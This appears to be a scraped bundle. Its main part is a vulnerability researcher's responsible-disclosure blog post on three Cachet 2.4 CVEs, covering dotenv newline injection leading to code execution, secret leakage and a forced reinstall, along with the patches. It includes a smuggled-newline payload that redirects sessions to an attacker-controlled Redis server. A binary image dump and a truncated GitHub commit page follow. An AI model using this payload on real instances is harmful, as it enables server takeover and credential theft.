=== Content from blog.sonarsource.com_96eca0c1_20250114_223146.html ===
NEW![Sonar has entered a definitive agreement to acquire Tidelift! Read the press release.](/company/press-releases/sonar-to-acquire-tidelift/) [![](data:image/svg+xml;charset=utf-8...)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)](/ "Home")

* Solutions

  Use Cases

  [AI-assisted & quality-assured codeEnsure code generated by AI assistants is of the highest quality](/solutions/ai/)[DevOps transformationHarness the full potential of DevOps by reducing roll backs and improving quality of releases](/solutions/devops-transformation/)[Code coverageEnsure code quality and security by facilitating faster debugging through clear visibility of coverage gaps.](/solutions/code-coverage/) [Reduce & manage technical debtMaximize innovation by proactively managing technical debt](/solutions/reduce-technical-debt/)[Secure by designIntegrate code security in compliance with NIST Secure Software Development Framework](/solutions/secure-by-design-code/)[All Use CasesRead more about Sonar Use cases with blog articles, technical articles and developer guides](/solutions/use-cases/)

  Clean Code

  [What is clean codeA detailed definition of Clean Code](/solutions/clean-code/)[Power of clean codeBusiness success built on Clean Code](/solutions/power-of-clean-code/)[Security starts with Clean CodeStatic Application Security Testing with Sonar](/solutions/security/)[Clean as You CodeOur unique approach to Clean Code](/solutions/our-unique-approach/)

  Something For Everyone

  [For DevelopersFind and fix issues as you code](/solutions/for-developers/)[For DevOpsBuild your apps on Clean Code foundations](/solutions/infrastructure-as-code/)[For EnterpriseClean Code delivery from development to production](/solutions/for-enterprise/)[For the Public SectorClean Code for the public sector](/solutions/public-sector/)
* Products

  Industry Leading Products

  [![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/aa3b1f02-f1b0-448f-a3f2-a1bd32923a08/SQ_Logo_Cloud_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarCloudCloud-based static analysis tool for your CI/CD workflows](/products/sonarcloud/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/bdac1871-464e-4051-88db-7df20c3bfffa/SQ_Logo_Server_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarQubeSelf-managed static analysis tool for continuous codebase inspection](/products/sonarqube/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/49f23af2-a29b-4d0f-95d7-ffd361f375e1/SQ_Logo_IDE_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarLintFree IDE extension that provides on-the-fly analysis and coding guidance](/products/sonarlint/)

  Languages and Frameworks

  [Java](/knowledge/languages/java/)[JavaScript](/knowledge/languages/js/)[TypeScript](/knowledge/languages/ts/)[Python](/knowledge/languages/python/)[C#](/knowledge/languages/csharp/)[C++](/knowledge/languages/cpp/)[C](/knowledge/languages/c/)[PHP](/knowledge/languages/php/)[Kotlin](/knowledge/languages/kotlin/)[See All](/lp/knowledge/languages/)
* Resources

  Learn About Clean Code

  [BlogStay connected with our latest development news and articles](/blog/)[Events hubLet's meet up online or in person - browse our conferences and webinars, or watch previous talks](/resources/events/)[Customer StoriesCheck out Sonar implementation success stories](/resources/customer-stories/)[White PapersFind in-depth articles on clean code](/resources/white-papers/)[LearnDeveloper learning hub - covering essential topics](/learn/)[Solution BriefsOur library of solution briefs](/resources/solution-briefs/)

  Go In Depth

  [SonarQube Server DocumentationFind more information on the technical details of SonarQube Server](https://docs.sonarsource.com/sonarqube/latest/)[SonarQube Cloud DocumentationFind more information on the technical details of SonarQube Cloud](https://docs.sonarsource.com/sonarcloud/)[SonarQube for IDE DocumentationFind more information on the technical details of SonarQube IDE](https://docs.sonarsource.com/sonarlint/)[Explore SonarpediaExplore our publicly available multi-language rules database](https://rules.sonarsource.com/)[LanguagesSee our multi-language coverage](/knowledge/languages/)
* Company

  Deliver Better Software

  [About UsSonarâ€™s industry leading solution enables developers to write clean code and remediate existing code organically](/company/about/)[CareersJoin our growing team](/company/careers/)[Commitment to open sourceOur commitment to transparency, security, and continuous improvement](/solutions/commitment-to-open-source/)[CommunityGet latest updates, suggest features, and share your knowledge](https://community.sonarsource.com/)[PartnersSonar partners with the best resellers to bring Clean Code closer to you](/company/partners/)[Contact usHave questions? Get in touch](/company/contact/)

  Media

  [NewsroomNews announcements, media coverage, and more](/company/newsroom/)[CoverageFind articles about Sonar in the news](/company/coverage/)[Press ReleasesThe latest Sonar updates](/company/press-releases/)[CustomersAn overview of customers using Sonar by industry](/company/customers/)[Press KitExecutive headshots, quick stats, customer logos, and more](/company/press-kit/)
[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)
Search modal toggle button[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)Mobile menu toggle button

Blog post

# Cachet 2.4: Code Execution via Laravel Configuration Injection

![](data:image/svg+xml;charset=utf-8...)![Thomas Chauchefoin photo]()![Thomas Chauchefoin photo](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/ddfcf9fd-16c2-4f57-8922-4198a01b5c2a/b0f43e1e-d67e-4bcf-a90c-0a1908c2b772_Thomas_Chauchefoin.jpg?w=800&h=800&auto=format&fit=crop)

Thomas Chauchefoin

Vulnerability Researcher

September 21, 2021

Date

* [Security](/blog/tag/security/)
![](data:image/svg+xml;charset=utf-8...)![We responsibly disclosed three vulnerabilities in the open-source status page Cachet, allowing attackers to take over instances. Here are all the details!](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/4eacb91e-afb6-4eeb-badc-307d6536c075/cover-123d8703-ee2c-4518-b7de-1a176fb5b5a9_Blogpost%2BCachet%25402x.png?w=2400&h=1256&auto=format&fit=crop)![We responsibly disclosed three vulnerabilities in the open-source status page Cachet, allowing attackers to take over instances. Here are all the details!](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/4eacb91e-afb6-4eeb-badc-307d6536c075/cover-123d8703-ee2c-4518-b7de-1a176fb5b5a9_Blogpost%2BCachet%25402x.png?w=2400&h=1256&auto=format&fit=crop)

Status pages are now an essential service offered by all Software-as-a-Service companies ([we do it too](https://sonarcloud.statuspage.io/ "we do it too")!). To help their adoption, startups quickly conceived status pages as-a-service, and open-source self-hosted alternatives were made available.Â [Cachet](https://github.com/cachethq/Cachet "Cachet"), also sometimes referred to as CachetHQ, is a broadly adopted status page system written in PHP and has many community forks such asÂ [fiveai/Cachet](https://github.com/fiveai/Cachet "fiveai/Cachet").

Compromising Cachet instances is rewarding for attackers, as they store secrets for various services such as caches, databases, email servers, etc. This initial foothold in the infrastructure is helpful for them to pivot into the internal network of the affected company and to perform further attacks. In this article, we present the technical analysis of three security bugs we discovered in Cachet 2.4. They can enable attackers to compromise the server.

## Impact

The exploitation of these vulnerabilities was verified on the last official release of Cachet at the time (2.3.18), as well as on the development branch (2.4). An attacker aspiring to exploit these vulnerabilities requires a valid user account with basic privileges, a scenario that can realistically be leveraged by:

* Using credentials stuffing, thanks to the considerable amount of accounts leaked every year;
* A compromised or malicious user;
* The presence of a Cross-Site Scripting vulnerability on the same perimeter;
* The exploitation of CVE-2021-39165, a pre-authenticated SQL injection in Cachet fixed in January 2021.

The first vulnerability (CVE-2021-39172) we describe is a newline injection that happens when users update an instance's configuration, such as the email settings. It allows attackers to inject new directives and to alter the behavior of core features, ultimately leading to the execution of arbitrary code.

The following video shows the exploitation of this vulnerability. For demonstration purposes, several steps are performed manually, but they could be automated by attackers:

The second one (CVE-2021-39174) is also related to this feature and allows the attacker to exfiltrate secrets that are stored in the configuration file, e.g. SMTP server password, the application encryption key, etc.

Finally, the last bug (CVE-2021-39173) is much simpler and allows going through the setup process even if the instance is already fully configured. That way, attackers can trick the Cachet instance into using an arbitrary database under their control, ultimately leading to arbitrary code execution.

Patches for these three vulnerabilities are available inÂ [release 2.5.1](https://github.com/fiveai/Cachet/releases/tag/v2.5.1 "release 2.5.1")Â of the FiveAI fork.

## Technical Details

In this section, we describe the technical details of each vulnerability and the way they were mitigated in the latest release of the community fork.

### CVE-2021-39172 - Remote Code Execution

The dashboard of Cachet exposes several configuration views (even to non-administrator users) to change the instance name, mail server settings, etc. Application-level persistent settings are saved in the database, and other framework-level values are directly saved in the application's configuration file. The Laravel framework usesÂ *dotenv*configuration files, a format similar to how you would declare environment variables in a shell script, and their support is implemented in the third-party libraryÂ [vlucas/phpdotenv](https://github.com/vlucas/phpdotenv "vlucas/phpdotenv").

When changing the email provider settings, the controller instantiates an object of the classÂ `UpdateConfigCommand`. Laravel Commands, in the context of the Command Bus, are a way to remove application-specific logic from controllers; they will be synchronously executed upon anÂ `execute()`Â call on the object. This is what happens atÂ `[1]`:

**app/Http/Controllers/Dashboard/SettingsController.php**

```
public function postMail()
{
    $config = Binput::get('config');
    execute(new UpdateConfigCommand($config));            // [1]
    return cachet_redirect('dashboard.settings.mail')
        ->withInput(Binput::all())
        ->withSuccess(trans('dashboard.notifications.awesome'));
}
```

The associated handler,Â `UpdateConfigCommandHandler`, is responsible for performing changes in the existingÂ *dotenv*Â file, by replacing existing entries with new ones.

`UpdateConfigCommandHandler`Â can be triggered by code at two different locations:

* `SetupController@postStep3`, the last step of the setup process. Once the instance is installed, this code path canâ€™t be reached anymore;
* `SettingsController@postMail`, when updating theÂ *dotenv*Â entries related to email servers.

It will first evaluate the full configuration file to populate the process environment (`[1]`), identify if the directive to update is already defined (`[2]`) and then replaced the entry with its new value (`[3]`):

**app/Bus/Handlers/Commands/System/Config/UpdateConfigCommandHandler.php**

```
class UpdateConfigCommandHandler
{
    // [...]
    public function handle(UpdateConfigCommand $command)
   {
       foreach ($command->values as $setting => $value) {
           $this->writeEnv($setting, $value);
       }
   }
   // [...]
   protected function writeEnv($key, $value)
   {
       $dir = app()->environmentPath();
       $file = app()->environmentFile();
       $path = "{$dir}/{$file}";

       try {
           (new Dotenv($dir, $file))->load();       // [1]

           $envKey = strtoupper($key);
           $envValue = env($envKey) ?: 'null';      // [2]

           file_put_contents($path, str_replace(    // [3]
               "{$envKey}={$envValue}",
               "{$envKey}={$value}",
               file_get_contents($path)
           ));
       } catch (InvalidPathException $e) {
           throw $e;
       }
   }
}
```

No validation is performed on the incoming data: as long as the configuration entry already exists, it will be replaced with a value coming from the parameter. If an attacker provides a value containing new lines, it will create new entries in theÂ *dotenv*Â file and may alter framework-level functionalities. It is worth noting that only the first definition of a variable in aÂ *dotenv*Â file will be used, subsequent ones will be ignored.

On Laravel projects, this primitive is enough to gain arbitrary code execution. The initialÂ *dotenv*Â configuration file will probably look like this on most instances:

**.env**

```
APP_ENV=production
[...]
DEBUGBAR_ENABLED=false
DB_DRIVER=sqlite
[...]
DB_PREFIX=
CACHE_DRIVER=file
SESSION_DRIVER=file
QUEUE_DRIVER=array
MAIL_DRIVER=smtp
MAIL_HOST=foo
[...]
REDIS_HOST=null
REDIS_DATABASE=null
REDIS_PORT=null
```

Attackers could replace theÂ `CACHE_DRIVER`Â key and register a Redis server under their control as new session backend:

```
file\nREDIS_HOST=some.remote.server\nREDIS_DATABASE=0\nREDIS_PORT=6379\nSESSION_DRIVER=redis
```

After sending a request that setsÂ `CACHE_DRIVER`Â to this value, theÂ *dotenv*Â file will look like this

**.env**

```
APP_ENV=production
APP_DEBUG=false
APP_URL=http://cachet.internal
APP_TIMEZONE=UTC
// [...]
CACHE_DRIVER=file
REDIS_HOST=some.remote.server
REDIS_DATABASE=0
REDIS_PORT=6379
SESSION_DRIVER=redis
SESSION_DRIVER=file
QUEUE_DRIVER=null
// [...]
```

Because Laravel sessions are serialized using PHPâ€™s native format, they are parsed with the functionÂ `unserialize()`. This is a known weakness that can be leveraged into the execution of arbitrary code by using a sequence of specially-crafted objects, a concept named â€œpopchainsâ€. The toolÂ Â [PHPGGC](https://github.com/ambionics/phpggc "PHPGGC")Â can generate such chains for Laravel projects.

Other ways to leverage command execution from a new line injection in aÂ *dotenv*Â file may exist, but we did not pursue more research in this direction. We are curious to know if youâ€™re aware of other techniques, though!

### CVE-2021-39174 - Configuration Leak

As we described in the previous section, one can have direct read and write control over values stored in theÂ *dotenv*Â file. Writing to this file ultimately leads to arbitrary code execution, but can it also be taken advantage of the fact that values of this file are displayed in the interface?

The documentation of vlucas/phpdotenv describes that it supportsÂ [nested variables assignment](https://github.com/vlucas/phpdotenv#nesting-variables "nested variables assignment"): when declaring a variable, you can reference a previously declared one with the syntaxÂ `${NAME}`.

This feature is convenient: by referencing another variable in an entry of theÂ *dotenv*Â configuration file and displaying this entry in the interface, it reveals another's variable value.

It is alreadyÂ [widely](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/http/laravel_token_unserialize_exec.rb "widely")Â [documented](https://blog.truesec.com/2020/02/12/from-s3-bucket-to-laravel-unserialize-rce/ "documented")Â that leakingÂ `APP_KEY`Â leads to code execution if the session driver is set to cookie, and this primitive can also be used to leakÂ `DB_PASSWORD`Â andÂ `MAIL_PASSWORD`Â to perform further attacks.

![](data:image/svg+xml;charset=utf-8...)![Proof-of-Concept of this behavior, leaking the value of APP_KEY.]()![Proof-of-Concept of this behavior, leaking the value of APP_KEY.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/6aeecf13-73ab-40d3-b58f-130227a11f5e/body-5bf944be-1691-45af-b4bb-1f81e12a1537_Blogpost%2BCachet%2BFinding%2B2.png?w=1606&h=572&auto=format&fit=crop)
### CVE-2021-39173 - Forced Reinstall

The setup page cannot be accessed if the instance is already installed, as implemented in the middlewareÂ `SetupAlreadyCompleted`:

**app/Http/Middleware/SetupAlreadyCompleted.php**

```
class SetupAlreadyCompleted
{
   // [...]
   public function handle(Request $request, Closure $next)
   {
       try {
           if ($this->settings->get('app_name')) {
               return cachet_redirect('dashboard');
           }
       } catch (ReadException $e) {
           // not setup then!
       }

       return $next($request);
   }
}
```

The check is solely based on the value of the setting app\_name: if not defined or empty, the middleware will consider that the instance is installed.

In case youâ€™re wondering what else can evaluate to false, here is a quick primer on PHPâ€™s typing system during comparisons until PHP 8. Comparison can be performed using an equality check (==) or an identity check (===). Equality checks imply that the type of the operands is not accounted for and that strings can be cast to numbers beforehand. This behavior has been named â€œtype jugglingâ€ and has been exploited in various real-life vulnerabilities ([CVE-2017-1001000](https://nvd.nist.gov/vuln/detail/CVE-2017-1001000 "CVE-2017-1001000"),Â [CVE-2019-10231](https://nvd.nist.gov/vuln/detail/CVE-2019-10231 "CVE-2019-10231")). In the case of the comparison above, any value equal to an empty string or 0 will evaluate to false and give access to the setup pages.

The value ofÂ `app_name`Â is not validated during settingsâ€™ update inÂ `SettingsController@postSettings`, atÂ `[1]`:

**app/Http/Controllers/Dashboard/SettingsController.php**

```
class SettingsController extends Controller
{
   // [...]
   public function postSettings()
   {
       $setting = app(Repository::class);
       // [...]
       $parameters = Binput::all();
       // [...]
       $excludedParams = [
           '_token',
           'app_banner',
           'remove_banner',
           'header',
           'footer',
           'stylesheet',
       ];

       try {
           foreach (Binput::except($excludedParams) as $settingName => $settingValue) {
               if ($settingName === 'app_analytics_pi_url') {
                        $settingValue = rtrim($settingValue, '/');
               }
               $setting->set($settingName, $settingValue); // <-- [1]
// [...]
```

Therefore, an authenticated user can update it to a value evaluating to false and then access /setup again to re-install the instance with a new administrator account (elevation of privileges) or to exploit our first finding and gain code execution (remember,Â `UpdateConfigCommandHandler`Â can also be exploited from this code path!).

### Patch

The new line injection vulnerability (CVE-2021-39172) was addressed by improving the validation of incoming values inÂ `UpdateConfigCommandHandler`,Â [rejecting any modification containing newline characters](https://github.com/fiveai/Cachet/commit/6442976c25930cb370c65a22784b9caee7ed1de2#diff-eb49382226800036f840983b448fee50b5167e6ccba0a08a7d95e3f8a3288d44R105-R106 "rejecting any modification containing newline characters").

The configuration leak bug (CVE-2021-39174) was more complex to patch, as the latest version of theÂ *dotenv*Â library could not be imported due to the existing dependencies. Instead,Â [relevant code was ported](https://github.com/fiveai/Cachet/commit/6442976c25930cb370c65a22784b9caee7ed1de2#diff-eb49382226800036f840983b448fee50b5167e6ccba0a08a7d95e3f8a3288d44R75-R92 "relevant code was ported")Â to allow the command handler to identify if a value contains a nested variable.

Finally, it is not possible to force a re-installation of existing instances (CVE-2021-39173)Â [thanks to improved checks in the impacted middleware](https://github.com/fiveai/Cachet/commit/ee7781e63f43d3bb3db56b74794c440fba2255ef "thanks to improved checks in the impacted middleware").

## Timeline

| **Date** | **Action** |
| --- | --- |
| 2021-03-26 | Issues reported by email to the official security disclosure address of the upstream project |
| 2021-06-25 | We send the security issues and patches to the community-supported fork (fiveai/Cachet) |
| 2021-08-27 | Release 2.5.1 of the FiveAI fork is published, with fixes for CVE-2021-39172, CVE-2021-39173, and CVE-2021-39174. |

## Summary

In this article, we analyzed three vulnerabilities in Cachet and demonstrated the ability to take over instances with only basic user permissions using Laravel configuration files. We also described the patches applied by the maintainers and how they prevent the attacks we presented.

Finally, we would like to thank the maintainers of the FiveAI fork of Cachet for acknowledging our advisory and fixing these vulnerabilities in a timely and professional manner.

#### SHARE

[twitter](https://twitter.com/share?text=undefined)[facebook](https://www.facebook.com/sharer/sharer.php?u=undefined)[linkedin](https://www.linkedin.com/sharing/share-offsite/?url=undefined)mail[Go to SonarSource homepage![](data:image/svg+xml;charset=utf-8...)![sonar logo ]()![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=160&h=40&auto=format&fit=crop)](/)

* **Sonar Solutions**
  + [SAST](/solutions/security/)
  + [What is clean code](/solutions/clean-code/)
  + [Power of clean code](/solutions/power-of-clean-code/)
  + [Clean as you code](/solutions/our-unique-approach/)
  + [AI-assisted & quality-assured code](/solutions/ai/)
  + [DevOps transformation](/solutions/devops-transformation/)
  + [Outsourcing software development](/solutions/reduce-outsourcing-software-development-risk/)
  + [Reduce & manage technical debt](/solutions/reduce-technical-debt/)
  + [Secure by design](/solutions/secure-by-design-code/)
  + [Code coverage](/solutions/code-coverage/)
  + [Code review](/solutions/code-review/)
  + [For developers](/solutions/for-developers/)
  + [For enterprise](/solutions/for-enterprise/)
  + [Infrastructure as code](/solutions/infrastructure-as-code/)
  + [Public sector](/solutions/public-sector/)
* **Products**
  + [SonarQube for IDE](/products/sonarlint/)
  + [SonarQube Server](/products/sonarqube/)
  + [SonarQube Cloud](/products/sonarcloud/)**Pricing**
  + [Start for free](/open-source-editions/)
  + [Explore pricing](/plans-and-pricing/)
* **Company**
  + [About](/company/about/)
  + [Careers](/company/careers/)
  + [Commitment to open source](/solutions/commitment-to-open-source/)
  + [Customers](/company/customers/)
  + [Partners](/company/partners/)
  + [Contact us](/company/contact/)
  + [Accessibility](/accessibility/)
  + [NEW! Brand identity](/brand-identity/)**Media**
  + [Coverage](/company/coverage/)
  + [Press releases](/company/press-releases/)
* **Resources**
  + [Events hub](/resources/events/)
  + [Customer stories](/resources/customer-stories/)
  + [White papers](/resources/white-papers/)
  + [Learn](/learn/guide/)
  + [Community](https://community.sonarsource.com/)
  + [Support](/support/)
* **Knowledge**
  + [Explore Sonarpedia](https://rules.sonarsource.com/)
  + [Blog](/blog/)
  + [Languages](/knowledge/languages/)
  + [SonarQube Server Documentation](https://docs.sonarsource.com/sonarqube/latest/)
  + [SonarQube Cloud Documentation](https://docs.sonarsource.com/sonarcloud/)
  + [SonarQube for IDE Documentation](https://docs.sonarsource.com/sonarlint/)

* [Legal documentation](/legal/)
* [Trust center](/trust-center/)

* [Follow SonarSource on Twitter](https://twitter.com/sonarsource)
* [Follow SonarSource on Linkedin](https://www.linkedin.com/company/sonarsource/)

Â© 2008-2025 SonarSource SA. All rights reserved. SONAR, SONARSOURCE, SONARQUBE, and CLEAN AS YOU CODE are trademarks of SonarSource SA.



=== Content from avatars.githubusercontent.com_a510c95e_20250115_195924.html ===
ï¿½ï¿½ï¿½ï¿½ ï¿½  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222ï¿½ï¿½  ( (" ï¿½ï¿½ï¿½          
   } !1AQa"q2ï¿½ï¿½ï¿½#Bï¿½ï¿½Rï¿½ï¿½$3brï¿½
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½       
  w !1AQaq"2ï¿½Bï¿½ï¿½ï¿½ï¿½ #3Rï¿½brï¿½
$4ï¿½%ï¿½&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½   ? ï¿½ï¿½ï¿½ï¿½.ï¿½Nï¿½ii<5ï¿½>q 6O `CXeï¿½ï¿½Oï¿½zOï¿½ï¿½Eï¿½ï¿½ï¿½+ï¿½{ËŸ,1ï¿½P1ï¿½ï¿½~Bï¿½9ï¿½ï¿½Wï¿½% ï¿½ï¿½[ï¿½ï¿½á¹?ï¿½ï¿½Rï¿½ï¿½ï¿½3qk
ï¿½ï¿½Jï¿½ï¿½ï¿½(ï¿½ï¿½1ï¿½ï¿½ï¿½w7zï¿½ï¿½ï¿½gO2ï¿½zï¿½ï¿½ï¿½ï¿½ï¿½\ï¿½&kï¿½8ï¿½ç°ºï¿½ï¿½ï¿½ï¿½9ï¿½U: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½e S2ï¿½ï¿½$jï¿½ï¿½Í›ï¿½Vf ï¿½ï¿½ï¿½G]ï¿½ï¿½ï¿½Ò¼ï¿½1<
Ğ´ï¿½ï¿½fï¿½cï¿½iï¿½jï¿½bï¿½ï¿½ 7ï¿½ï¿½ï¿½ï¿½@ï¿½ï¿½Zï¿½ï¿½z}ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½3Gwoï¿½ï¿½Iï¿½XË¬{Yï¿½ï¿½ï¿½?\ï¿½ï¿½ï¿½\_ï¿½ï¿½-ï¿½ï¿½ï¿½ Wï¿½ï¿½Frï¿½ï¿½ï¿½Vï¿½ï¿½Sï¿½.<ï¿½,ï¿½ï¿½ï¿½rWwï¿½3ï¿½Ş€ ï¿½ï¿½$ï¿½hï¿½}ï¿½ï¿½qIï¿½ï¿½ï¿½\*ï¿½:ï¿½İ¿ï¿½ï¿½ï¿½~ï¿½ï¿½ï¿½@ï¿½jï¿½ï¿½ï¿½Şªï¿½uqï¿½ï¿½woï¿½ï¿½ï¿½Pï¿½4ï¿½Q@ï¿½ï¿½

=== Content from github.com_2283f991_20250115_124527.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffiveai%2FCachet%2Fcommit%2F6442976c25930cb370c65a22784b9caee7ed1de2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffiveai%2FCachet%2Fcommit%2F6442976c25930cb370c65a22784b9caee7ed1de2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=fiveai%2FCachet)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fiveai](/fiveai)
/
**[Cachet](/fiveai/Cachet)**
Public

forked from [cachethq/cachet](/cachethq/cachet)

* [Notifications](/login?return_to=%2Ffiveai%2FCachet) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Ffiveai%2FCachet)
* [Star
   102](/login?return_to=%2Ffiveai%2FCachet)

* [Code](/fiveai/Cachet)
* [Issues
  32](/fiveai/Cachet/issues)
* [Pull requests
  8](/fiveai/Cachet/pulls)
* [Actions](/fiveai/Cachet/actions)
* [Projects
  0](/fiveai/Cachet/projects)
* [Security](/fiveai/Cachet/security)
* [Insights](/fiveai/Cachet/pulse)

Additional navigation options

* [Code](/fiveai/Cachet)
* [Issues](/fiveai/Cachet/issues)
* [Pull requests](/fiveai/Cachet/pulls)
* [Actions](/fiveai/Cachet/actions)
* [Projects](/fiveai/Cachet/projects)
* [Security](/fiveai/Cachet/security)
* [Insights](/fiveai/Cachet/pulse)

## Commit

[Permalink](/fiveai/Cachet/commit/6442976c25930cb370c65a22784b9caee7ed1de2)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Prevent new lines and variables in settings values

[Browse files](/fiveai/Cachet/tree/6442976c25930cb370c65a22784b9caee7ed1de2)
Browse the repository at this point in the history

```
[GHSA-88f9-7xxh-c688](https://github.com/advisories/GHSA-88f9-7xxh-c688 "GHSA-88f9-7xxh-c688") and [GHSA-9jxw-cfrh-jxq6](https://github.com/advisories/GHSA-9jxw-cfrh-jxq6 "GHSA-9jxw-cfrh-jxq6")
```

* Loading branch information

[![@sedan07](https://avatars.githubusercontent.com/u/1449113?s=40&v=4)](/sedan07)

[sedan07](/fiveai/Cachet/commits?author=sedan07 "View all commits by sedan07")
committed
Aug 27, 2021

1 parent
[59f2e85](/fiveai/Cachet/commit/59f2e85cc7f09164050fa1e4638f3996ee837359)

commit 6442976

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**118 additions**
and
**18 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* app/Bus

  + Exceptions/Setting

